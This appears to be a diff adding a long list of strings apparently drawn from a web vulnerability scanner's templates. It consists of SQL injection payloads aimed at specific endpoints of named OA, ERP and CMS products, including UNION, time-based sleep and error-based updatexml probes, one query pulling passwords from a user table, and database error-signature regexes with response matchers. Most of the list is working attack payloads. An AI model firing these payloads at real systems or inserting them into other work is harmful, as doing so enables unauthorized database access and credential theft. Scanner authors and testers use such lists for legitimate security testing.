+- "UNION SELECT NULL,NULL,NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL,NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION query has different number of fields: \\d+, \\d+"
+- "Unclosed quotation mark after the character string"
+- "Unclosed quotation mark"
+- "Unexpected end of command in statement \\["
+- "Unexpected end of command in statement"
+- "Unexpected token.*?in statement \\["
+- "Unexpected token.*?in statement"
+- "Unknown column '[^ ]+' in 'field list'"
+- "Virtuoso S0002 Error"
+- "WAITFOR+DELAY+%270:0:5%27--"
+- "WP Fastest Cache"
+- "WP Statistics"
+- "Warning"
+- "Warning.*?\\W(mssql|sqlsrv)_"
+- "Warning.*?\\W(oci|ora)_"
+- "Warning.*?\\W(sqlite_|SQLite3::)"
+- "Warning.*?\\Wibase_"
+- "Warning.*?\\Wifx_"
+- "Warning.*?\\Wingres_"
+- "Warning.*?\\Wmaxdb_"
+- "Warning.*?\\Wmysqli?_"
+- "Warning.*?\\Wpg_"
+- "Warning.*?\\Wsybase_"
+- "Warning: mysql"
+- "Warning: mysqli"
+- "Windows IP"
+- "WordPress WP-Advanced-Search"
+- "XOR(SELECT CASE WHEN({{randomnum1}}={{randomnum1}}) THEN SLEEP({{randomtime}}) ELSE 0 END)XOR'Z"
+- "XOR(SELECT(0)FROM(SELECT(SLEEP({{randomtime}})))a)XOR'Z"
+- "XOR(if(now()=sysdate(),SLEEP({{randomtime}}),0))XOR'Z"
+- "XPATH syntax error"
+- "XPATH syntax error:"
+- "You have an error in your SQL syntax"
+- "You have an error in your SQL syntax;"
+- "Zend_Db_(Adapter|Statement)_Db2_Exception"
+- "Zend_Db_(Adapter|Statement)_Mysqli_Exception"
+- "Zend_Db_(Adapter|Statement)_Oracle_Exception"
+- "Zend_Db_(Adapter|Statement)_Sqlsrv_Exception"
+- "Zero Spam"
+- "[]"
+- "\" "
+- "\" WHERE {{randomnum1}}={{randomnum1}} "
+- "\""
+- "\") "
+- "\") AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+- "\") WHERE {{randomnum1}}={{randomnum1}} "
+- "\")) "
+- "\")) AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+- "\"))) "
+- "\")/*F*/or/*f*/sleep(7)%23"
+- "\"/*F*/or/*f*/sleep(7)%23"
+- "\"value\""
+- "\\[(Virtuoso Driver|Virtuoso iODBC Driver)\\]\\[Virtuoso Server\\]"
+- "\\[-3008\\].*?: Invalid keyword or missing delimiter"
+- "\\[42000-192\\]"
+- "\\[MonetDB\\]\\[ODBC Driver"
+- "\\[SQL Server\\]"
+- "\\[SQLITE_ERROR\\]"
+- "\\bORA-\\d{5}"
+- "\\bSQL Server[^&lt;&quot;]+Driver"
+- "\\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}"
+- "\\bdb2_\\w+\\("
+- "\u767b\u5f55\u6210\u529f"
+- "]-(SELECT 0 WHERE {{randomnum1}}={{randomnum1}} "
+- "` WHERE {{randomnum1}}={{randomnum1}} "
+- "`) WHERE {{randomnum1}}={{randomnum1}} "
+- "antiadwa\": 1"
+- "application/vnd.ms-excel"
+- "b52d04dc20036dbd8313ed055"
+- "baseSql"
+- "bdb2_"
+- "browserUrl"
+- "c4ca"
+- "c4ca4238a0b923820dcc509a6f75849"
+- "c4ca4238a0b923820dcc509a6f75849b"
+- "c678aec6e828c899b32a099c14ee882c"
+- "c8c605999f3d8352d7bb792cf3fdb25"
+- "c8c605999f3d8352d7bb792cf3fdb25b"
+- "check the manual that (corresponds to|fits) your Drizzle server version"
+- "check the manual that (corresponds to|fits) your MariaDB server version"
+- "check the manual that (corresponds to|fits) your MySQL server version"
+- "checkstate"
+- "code"
+- "com\\.facebook\\.presto\\.jdbc"
+- "com\\.frontbase\\.jdbc"
+- "com\\.ibm\\.db2\\.jcc"
+- "com\\.informix\\.jdbc"
+- "com\\.ingres\\.gcf\\.jdbc"
+- "com\\.jnetdirect\\.jsql"
+- "com\\.mckoi\\.JDBCDriver"
+- "com\\.mckoi\\.database\\.jdbc"
+- "com\\.microsoft\\.sqlserver\\.jdbc"
+- "com\\.mimer\\.jdbc"
+- "com\\.mysql\\.jdbc"
+- "com\\.sap\\.dbtech\\.jdbc"
+- "com\\.simba\\.presto\\.jdbc"
+- "com\\.sybase\\.jdbc"
+- "com\\.vertica\\.dsi\\.dataengine"
+- "com\\.vertica\\.jdbc"
+- "contains((body), 'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near')"
+- "contains((body_1), 'You have an error in your SQL syntax')"
+- "contains(body,'65025')"
+- "contains(body,'clistbox') && contains(body,'UserID,GroupID,LoginName,Password')"
+- "contains(body_2, md5(random_string))"
+- "contains_all(body,'c8c605999f3d8352d7bb792cf3fdb25', 'XPATH')"
+- "contains_all(header, 'application/json','ecology_')"
+- "count"
+- "countSql"
+- "data"
+- "dianju/delete_log.php"
+- "dianju/log.php"
+- "dilemma"
+- "dns"
+- "duration<=7"
+- "duration>=7 && duration <=16"
+- "duration>=7 && duration <=20"
+- "duration>=7 && duration<=8"
+- "e10adc3949ba59abbe56e057f20f883e"
+- "e807f1fcf82d132f9bb018ca6738a19f"
+- "encountered after end of query"
+- "eoffice"
+- "errtype"
+- "examscore\": 1"
+- "file_count"
+- "g_login_user_priv"
+- "http"
+- "ibm_db_dbi\\.ProgrammingError"
+- "id"
+- "if(now()=sysdate()%2Csleep(6)%2C0)"
+- "if(now()=sysdate(),SLEEP(7),0)"
+- "if(now()=sysdate(),SLEEP({{randomtime}}),0)"
+- "insert into FILE_CONTENT("
+- "interface/go.php"
+- "io\\.crate\\.client\\.jdbc"
+- "io\\.prestosql\\.jdbc"
+- "is not supported by MemSQL"
+- "iweboffice/delete_seal.php"
+- "iweboffice/manage.php"
+- "len(body) > 0"
+- "list"
+- "macromedia\\.jdbc\\.oracle"
+- "macromedia\\.jdbc\\.sqlserver"
+- "method == 'POST'"
+- "mismatched input '<EOF>'"
+- "mySQL error"
+- "mySQL query error"
+- "mysql"
+- "mysql_fetch"
+- "nl\\.cwi\\.monetdb\\.jdbc"
+- "nvarchar"
+- "oracle\\.jdbc"
+- "org\\.apache\\.derby"
+- "org\\.firebirdsql\\.jdbc"
+- "org\\.h2\\.jdbc"
+- "org\\.hibernate\\.QueryException:"
+- "org\\.hibernate\\.exception\\.SQLGrammarException"
+- "org\\.hsqldb\\.jdbc"
+- "org\\.jkiss\\.dbeaver\\.ext\\.vertica"
+- "org\\.postgresql\\.jdbc"
+- "org\\.postgresql\\.util\\.PSQLException"
+- "org\\.sqlite\\.JDBC"
+- "parentdirId"
+- "permissions"
+- "php,php3,php4,php5"
+- "qa0211180240"
+- "qbzqq1qzvjq"
+- "quoted string not properly terminated"
+- "qvvkq1qqxjq1"
+- "qxjpqjWUIWcKtHqhks"
+- "qzbxqoaqxzqq"
+- "qzzkqzzkq"
+- "rdmStmtPrepare\\(.+?\\) returned"
+- "reason\":\"success"
+- "register fail,please again"
+- "register_for/?rid="
+- "root"
+- "search_excel.php"
+- "select%201%20from%20pg_sleep(7)"
+- "sessionid"
+- "sql error"
+- "sql"
+- "sql_error:MySQL Query Error"
+- "sqlite"
+- "sqlite3.OperationalError:"
+- "src_fld\":null"
+- "src_obj_type\":\"businesInfo\",\"src_fld"
+- "statementSQL"
+- "status_code == 200 && contains(body,'65025')"
+- "status_code == 200 && contains_all((body), 'xml','<root>','</root>') && contains(header,'text/xml')"
+- "status_code == 200 && duration >= 3 && contains(header,'Set-Cookie: OASESSIONID') && contains(body,'ifocus_piclist')"
+- "status_code == 200 && duration >=3 && contains(header,'Set-Cookie: OASESSIONID') && contains(body,'ifocus_piclist')"
+- "status_code == 200 && duration >=3 && contains_all(body,'code','message')"
+- "status_code == 200 && duration >=5 && contains(body,'[]')"
+- "status_code == 200 && duration>=3 && duration<=10"
+- "status_code == 200 && duration>=3 && duration<=8 && contains(header,'image')"
+- "status_code == 200 && duration_2 >=3 && duration_3 >=6 && contains(body_2,'0') && contains(body_3,'0') && len(trim_space(body_2)) == 1 && len(trim_space(body_3)) == 1"
+- "status_code == 200 && duration_2 >=3 && duration_3 >=6 && contains(header,'text/html')"
+- "status_code == 200 && duration_2 >=3 && duration_3 >=6 && contains_all(body_2,'rootPath','saveHTML') && contains_all(body_3,'rootPath','saveHTML')"
+- "status_code == 200 && duration_2 >=3 && duration_3 >=6 && contains_all(body_2,'value','</option>') && contains_all(body_3,'value','</option>')"
+- "status_code == 200 && duration_4 >=3 && duration_5 >=6 && contains(header,'text/html')"
+- "status_code == 200 && duration_4 >=3 && duration_5 >=6 && contains_all(body_3,'rootPath','saveHTML') && contains_all(body_4,'rootPath','saveHTML')"
+- "status_code == 200 && duration_4 >=3 && duration_5 >=6 && contains_all(body_3,'value','</option>') && contains_all(body_4,'value','</option>')"
+- "status_code == 200"
+- "status_code == 500 && contains_all(body,'nvarchar','#39')"
+- "status_code==200"
+- "status_code_1 == 200 && contains((body_1), '/seeyonreport/ReportServer?op=widget&widgetname=null&sessionID=')"
+- "status_code_1 == 200 && contains((body_1), 'System.ArgumentException')"
+- "status_code_1 == 200 && contains((body_1), 'email_select')"
+- "status_code_1 == 200 && contains((body_1), 'licenseWeworkCount') && contains(header_1, 'application/json')"
+- "status_code_1 == 200 && contains(body_1,'soap')"
+- "status_code_1 == 200 && duration>=3 && contains(body,'file_count') && contains(header,'application/json')"
+- "status_code_1 == 200 && duration>=3 && duration<=10 && contains(header_1, 'text/html')"
+- "status_code_1 == 200 && duration>=5 && duration<=8 && contains(body,'登录失败,请查询您的信息输入是否正确') && contains(header,'text/plain')"
+- "status_code_1 == 200 && duration>=5 && duration<=9 && contains(body,'waitfor delay') && contains(header,'text/html')"
+- "status_code_1 == 200 && duration_1 >=3 && duration_1 <=7 && contains(header_1,'text/html') && contains_all(body_1,'result','username','data')"
+- "status_code_1 == 200 && status_code_2 == 200 && contains_all(body_1,'错误信息','列名','HttpUnhandledException') && contains_all(body_2,'错误信息','附近有语法错误','HttpUnhandledException')"
+- "status_code_1 == 200 && status_code_2 == 200"
+- "status_code_1 == 200"
+- "status_code_2 == 200 && contains((body_2), 'Ufida.T.EAP.ErrorInfo.DatabaseException')"
+- "status_code_2 == 200"
+- "status_code_2 == 302 && contains((header_2), '.php?start=')"
+- "status_code_2 == 403 && duration_2 >=3 && duration_1 <=7 && contains(header_2,'application/json') && contains_all(body_2,'message','name')"
+- "status_code_2 == 500 && contains(body_2,'soap')"
+- "status_code_3 == 200 && contains((body_3), 'var isIE = FR.Browser.isIE();')"
+- "syntax error"
+- "text/html"
+- "text/plain"
+- "text/xml"
+- "thumbUrl"
+- "total"
+- "type=dberror"
+- "uid="
+- "unsupported nested scalar subselect"
+- "unterminated quoted string"
+- "use_finger.php"
+- "valid MySQL result"
+- "valid PostgreSQL result"
+- "value=\"admin:(\\w{32})\""
+- "webform.WebOffice.FileName"
+- "weblogic\\.jdbc\\.informix"
+- "{\"RetCode\":0}"
+- "{\"RetCode\":2}"
+- "{{BaseURL}} %22 OR 1 = 1 -- -#"
+- "{{BaseURL}} %22%22|0;#"
+- "{{BaseURL}} ' GROUP BY columnnames having 1=1 --"
+- "{{BaseURL}} ' OR '1"
+- "{{BaseURL}} ' OR 1 -- -"
+- "{{BaseURL}} ' or#"
+- "{{BaseURL}} ''"
+- "{{BaseURL}} -2"
+- "{{BaseURL}} 1 or 1"
+- "{{BaseURL}} 1' GROUP BY 1,2,--+"
+- "{{BaseURL}} 1' GROUP BY 1,2,3--+"
+- "{{BaseURL}} 1' ORDER BY 1,2,3--+"
+- "{{BaseURL}} 1' ORDER BY 1,2--+"
+- "{{BaseURL}} 1' ORDER BY 1--+"
+- "{{BaseURL}} 1' ORDER BY 2--+"
+- "{{BaseURL}} 1' ORDER BY 3--+"
+- "{{BaseURL}} 1*56"
+- "{{BaseURL}} 1-false"
+- "{{BaseURL}} 1-true"
+- "{{BaseURL}} AND 0"
+- "{{BaseURL}} AND 1"
+- "{{BaseURL}} AND false"
+- "{{BaseURL}} AND true"
+- "{{BaseURL}} OR 1=1"
+- "{{BaseURL}}"
+- "{{BaseURL}}%22"
+- "{{BaseURL}}%27"
+- "{{BaseURL}}%2A"
+- "{{BaseURL}}%2C"
+- "{{BaseURL}}%5C"
+- "{{BaseURL}}%60"
+- "{{BaseURL}}' AND id IS NULL; --"
+- "{{BaseURL}}' OR '1"
+- "{{BaseURL}}' OR 'x'='x"
+- "{{BaseURL}}' OR 1 -- -"
+- "{{BaseURL}}'"
+- "{{BaseURL}}')"
+- "{{BaseURL}}'='"
+- "{{BaseURL}}'=0--+"
+- "{{BaseURL}}'LIKE'"
+- "{{BaseURL}}*"
+- "{{BaseURL}}+"
+- "{{BaseURL}}-"
+- "{{BaseURL}}-- or #"
+- "{{BaseURL}}-x()"
+- "{{BaseURL}}/!1111'/"
+- "{{BaseURL}}/"
+- "{{BaseURL}}/'"
+- "{{BaseURL}}/*…*/"
+- "{{BaseURL}}//"
+- "{{BaseURL}}/0%27XOR(if(now()=sysdate(),sleep(9),0))XOR%27Z/"
+- "{{BaseURL}}/?M_id=1%27&type=product"
+- "{{BaseURL}}/?case=crossall&act=execsql&sql=WY8gzSfZwW9R5YvyK"
+- "{{BaseURL}}/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y'+union+select+substring(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{num}}')),3,32)--"
+- "{{BaseURL}}/Api/portal/elementEcodeAddon/getSqlData?sql="
+- "{{BaseURL}}/Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes('MD5','{{num}}')),3,32)"
+- "{{BaseURL}}/NodeProdCategory.aspx?action=GetChildNode&CategoryId=2%20AND%201=@@version"
+- "{{BaseURL}}/Plan/plancommentlist.aspx?type=3and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--&targetid=1"
+- "{{BaseURL}}/SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+"
+- "{{BaseURL}}/WebSer~1/create_site.php?site_id=1"
+- "{{BaseURL}}/WebUtility/SearchCondiction.aspx?PageId=1%20and%201=(CHAR(113)%2bCHAR(122)%2bCHAR(122)%2bCHAR(107)%2bCHAR(113)%2bCHAR(122)%2bCHAR(122)%2bCHAR(107)%2bCHAR(113))--"
+- "{{BaseURL}}/a/sys/user/resetPassword?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20md5({{num}})),0x7e),1))%23"
+- "{{BaseURL}}/admin/cms_channel.php?del=123456+AND+(SELECT+1+FROM(SELECT+COUNT(*)%2cCONCAT(0x7e%2cmd5(202072102)%2c0x7e%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)--%2b'"
+- "{{BaseURL}}/admin/cms_channel.php?del=123456+AND+(SELECT+1+FROM(SELECT+COUNT(*)%2cCONCAT(0x7e%2cmd5({{num}})%2c0x7e%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)--%2b'"
+- "{{BaseURL}}/api/products?sid=1%27"
+- "{{BaseURL}}/api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20MD5(1234)),0x7e),1)--%20"
+- "{{BaseURL}}/api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20MD5({{num}})),0x7e),1)--%20"
+- "{{BaseURL}}/app_dev.php/1'%20%22"
+- "{{BaseURL}}/arcade.php?act=Arcade&do=stats&comment=a&s_id=1'"
+- "{{BaseURL}}/bottomframe.cgi?user_name='))%20union%20select%20md5(1)%23where%20name%3d'superadmin'%23"
+- "{{BaseURL}}/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=?&ids[0][product_id][to]=)))%20OR%20(SELECT%201%20UNION%20SELECT%202%20FROM%20DUAL%20WHERE%201=0)%20--%20-"
+- "{{BaseURL}}/client/CloseMsg.aspx?user=%27%20and%20(select%20db_name())>0--&pwd=1"
+- "{{BaseURL}}/client/checkuser.aspx?user=%27and%20@@version>0--&pwd=1"
+- "{{BaseURL}}/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5({{num}})))),@`%27`"
+- "{{BaseURL}}/comment/api/index.php?gid=1&page=2&type=1&rlist[]=1)@`%27`union%2d%2d%0aselect%23%0A1,2,3,4,5,6,7,8,9,10,11%23%0Afrom%23%0Asea_admin--%20%27"
+- "{{BaseURL}}/common/dept.jsp?deptid=1'+UNION+ALL+SELECT+60%2Csys.fn_sqlvarbasetostr(HASHBYTES('MD5'%2C'{{num}}'))--+"
+- "{{BaseURL}}/datacenter/downloadApp/showInfoEdit.do?_1428145745205&id=dc5593e2e6dd4d2fa4c1651aa2202c99&time=1428145745185&type='+AND+updatexml(1,concat('~',(select+md5(123))),1)+AND+'Ramv'%3d'Ramv"
+- "{{BaseURL}}/folderViewAllFiles.psp?start=0&count=60&url=%2F&dirId=\\%27+union+select+null,name,null,sql,null,null+from+sqlite_master+--+"
+- "{{BaseURL}}/fs/"
+- "{{BaseURL}}/general/management_center/portal/oa_engine/engine_manage_bulletin_number/query.php"
+- "{{BaseURL}}/ikaimi/rolling/list.php?line=10&page=&classid=10)%20UNION%20ALL%20SELECT%20CONCAT(0x71786a7171,md5(123),0x716a6b6b71),NULL,NULL,NULL,NULL--+-"
+- "{{BaseURL}}/images/lists?cid=13%20)%20ORDER%20BY%201%20desc,extractvalue(rand(),concat(0x7c,md5(123),0x7c,user(),0x7c,@@version))%20desc%20--%20"
+- "{{BaseURL}}/inc/finger/use_finger.php?USER_ID=-123%df'and extractvalue(1, concat(0x5c,(database())))%23"
+- "{{BaseURL}}/index.php/Mobile/Goods/goodsList/id/1/sort_asc/desc,extractvalue(1,concat(0x7e,(select%20md5(1)),0x7e))"
+- "{{BaseURL}}/index.php?m=member&f=login_save"
+- "{{BaseURL}}/index.php?option=com_departments&id=-1%20UNION%20SELECT%201,md5({{num}}),3,4,5,6,7,8--"
+- "{{BaseURL}}/index.php?option=com_oscommerce&osMod=mshop_pl_src&manufacturers_id=7&sort=products_sort_order&page=index.php&format=xml&task=showproducts&view=med&sort=latest&sortdir=%27"
+- "{{BaseURL}}/index.php?s=api&c=api&m=template&app=admin&name=api_related.html&phpcmf_dir=admin&mid=%20action=function%20name=phpinfo%20param0=-1"
+- "{{BaseURL}}/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5(123),0x7e),1)"
+- "{{BaseURL}}/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5({{num}}),0x7e),1)"
+- "{{BaseURL}}/interface/auth.php?&PASSWORD=1&USER_ID=%df%27 and (select 1 from (select count(*),concat((select concat(0x3a,(select database()) ,0x3a) from user limit 1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23"
+- "{{BaseURL}}/interface/ugo.php?OA_USER=a%2527%20and%201=(select%201%20from(select%20count(*),concat((select%20database()),0x7c,user(),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20%25271%2527=%25271"
+- "{{BaseURL}}/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+547653*865674+as+id"
+- "{{BaseURL}}/js/player/dmplayer/dmku/index.php?ac=so&key=1"
+- "{{BaseURL}}/kingdee/tree/tree/get_flow.jsp?ids=1&file_type=1)%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--"
+- "{{BaseURL}}/member/ajax_membergroup.php?action=post&membergroup=@`'`/*!50000Union+*/+/*!50000select+*/+md5(999999)+--+@`'`"
+- "{{BaseURL}}/member/ajax_membergroup.php?action=post&membergroup=@`'`/*!50000Union+*/+/*!50000select+*/+md5({{num}})+--+@`'`"
+- "{{BaseURL}}/member/login.php/aa'UNION%20SELECT%20(md5(123)),2,3,4,5,6,1111,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29%23/aa"
+- "{{BaseURL}}/mobile/plugin/CheckServer.jsp?type=mobileSetting"
+- "{{BaseURL}}/mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null"
+- "{{BaseURL}}/modules/mail/main/maildetail.php?id=-1%27%20union%20all%20select%201,2,md5(4756),md5(4756),md5(4756),6,7,8,md5(4756),md5(4756),md5(4756),12,13,14,15,16,17,18--%20-"
+- "{{BaseURL}}/news_show.php?id=-%27/*!union/*!select/*!1,2,3,md5(123),5,6,7,8,9,10,11,12,13,14,15*/--%20-"
+- "{{BaseURL}}/pf/rate.php?id=-1+UNION+ALL+SELECT+NULL,CONCAT(0x23,md5(123),0x23)--+-"
+- "{{BaseURL}}/php/report/lastlogin_list_export.php?stime=a&time=0000-00-01%20union%20select%20@@hostname,0x7e7077,3%20%23"
+- "{{BaseURL}}/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user"
+- "{{BaseURL}}/plugins/servlet/oauth/users/icon-uri?consumerUri={{SQLI}}"
+- "{{BaseURL}}/plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27union+/*!50000SeLect*/+1,md5(123),3+from+qs_admin%23--"
+- "{{BaseURL}}/plus/count.php?view=yes&aid=1+and+updatexml(1,(hex(md5(123))),1)+and+1=1--+-"
+- "{{BaseURL}}/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(%27sycnb%27)),0x7e),1)--%22%7D/extend/%7B%7D"
+- "{{BaseURL}}/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--%22%7D/extend/%7B%7D"
+- "{{BaseURL}}/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5({{num}})),0x7e),1)--%22%7D/extend/%7B%7D"
+- "{{BaseURL}}/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','{{num}}')),4,5,6,7"
+- "{{BaseURL}}/royal_event/btndates_report.php#?="
+- "{{BaseURL}}/services/WorkPlanService"
+- "{{BaseURL}}/servlet/com.sksoft.bill.QueryService?service=query&content=SELECT%20HashBytes('md5','{{str}}');"
+- "{{BaseURL}}/share/handle.php?_GET[module]=1%27+and+1=%7B%60=%27%60+1%7D+and+1=0+union+select+(select/**/md5({{num}}))--+%27"
+- "{{BaseURL}}/share/handle.php?_GET[module]=1'+and+1={`='`+1}+and+1=0+union+select+(select/**/md5({{num}}))--+'"
+- "{{BaseURL}}/sitemap.xml?offset=1%3bSELECT%20IF((8303%3E8302)%2cSLEEP(10)%2c2356)%23"
+- "{{BaseURL}}/sqlite/"
+- "{{BaseURL}}/taste/addTaste?company=111&userName=111&openid=111&source=111&mobile=111"
+- "{{BaseURL}}/template/default/print.php?id=702%27%20AND%20(SELECT%201040%20FROM(SELECT%20COUNT(*),CONCAT(md5(123),(SELECT%20(ELT(1040=1040,1))),md5(123),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20%27TrDc%27=%27TrDc"
+- "{{BaseURL}}/tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=')AND+1+IN+(SELECT+sys.fn_varbintohexstr(hashbytes('MD5'%2C'999999999')))--+"
+- "{{BaseURL}}/tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(SELECT+sys.fn_varbintohexstr(hashbytes('MD5'%2C'999999999')))%20--&preload=1"
+- "{{BaseURL}}/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager"
+- "{{BaseURL}}/upload/mobile/index.php?c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5(1),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)''"
+- "{{BaseURL}}/upload/mobile/index.php?c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5({{num}}),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)''"
+- "{{BaseURL}}/user/City_ajax.aspx?CityId=33'union%20select%20sys.fn_sqlvarbasetostr(HashBytes('MD5','{{randstr}}')),2--"
+- "{{BaseURL}}/weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1"
+- "{{BaseURL}}/webservice/get_usedspace.php?site_id=-1%20and%201=2%20union%20all%20select%20(md5(123))"
+- "{{BaseURL}}/yyoa/common/js/menu/test.jsp;1.js?doType=101&S1=(SELECT%20md5(123456))"
+- "{{BaseURL}}/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(123))"
+- "{{BaseURL}}/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(123456))"
+- "{{BaseURL}}/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{randstr}}))"
+- "{{BaseURL}}/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids=(17) union all select md5(123456)%23"
+- "{{BaseURL}}/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17) union all select 1,2,md5(123456),4#"
+- "{{BaseURL}}/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(123)),4#"
+- "{{BaseURL}}1 or 1"
+- "{{BaseURL}};"
+- "{{BaseURL}}OR 1=1"
+- "{{BaseURL}}[1]"
+- "{{BaseURL}}[]"
+- "{{BaseURL}}`))"
+- "{{BaseURL}}``"
+- "{{BaseURL}}{{exts}}{{sleep_payload}}"
+- "{{BaseURL}}{{path_fuzz}}"
+- "{{RootURL}/api/dp/loglastsync?ccid=a%27));select%20pg_sleep(1)--%20"
+- "{{RootURL}}/E-mobile/App/Init.php?m=getSelectList_Crm"
+- "{{RootURL}}/api/client/getgidsbymids?sign=6824fb5c045b6ab3062c6f3053d04dbb&t=123&mids=4131%27"
+- "{{RootURL}}/api/client/getsimilarlist?status[0,1%29+union+all+select+%28%2F%2A%2150000select%2A%2F+79787337%29%2C+setting%2C+setting%2C+status%2C+name%2C+create_time+from+%22user%22+where+1+in+%281]=1&status[0]=1"
